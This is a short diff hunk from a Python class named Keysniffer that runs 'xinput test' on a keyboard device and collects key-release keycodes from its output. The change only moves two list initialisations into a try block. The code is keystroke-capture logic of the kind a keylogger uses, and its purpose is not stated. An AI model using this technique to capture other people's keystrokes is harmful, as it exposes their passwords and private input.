@@ -159,19 +159,15 @@ class Keysniffer():
 					return enter
 				else:
 					continue
-	
 		enter = get_enter()
 
 		# Call xinput to start sniffing keycodes and pipe its output 
 		keystream = subprocess.Popen((self.xinput, 'test', self.keyboards[0]), 
 									  stdout=subprocess.PIPE, 
 									  universal_newlines=True)
-		
-		# stream_buffer = []
-		kc = ['']
-		master_db = []
-
 		try:
+			kc = ['']
+			master_db = []
 			for line in keystream.stdout:
 				if "release" in line:
 					kc.append(str(line).strip().split()[-1])
